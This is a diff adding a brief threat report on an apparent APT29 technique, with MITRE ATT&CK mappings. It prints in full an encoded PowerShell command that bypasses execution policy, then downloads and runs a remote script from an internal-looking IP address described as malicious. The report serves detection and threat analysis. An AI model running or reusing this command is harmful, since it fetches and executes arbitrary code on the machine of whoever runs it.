@@ -1,0 +1,9 @@
+Threat Report: APT29 PowerShell Encoded Command Execution
+
+The attacker used PowerShell to download and execute a malicious payload. The command line observed was:
+
+powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
+
+This technique is consistent with T1059.001 (PowerShell execution) and T1105 (Ingress Tool Transfer).
+
+The encoded command decodes to a web client download from a known malicious IP address.
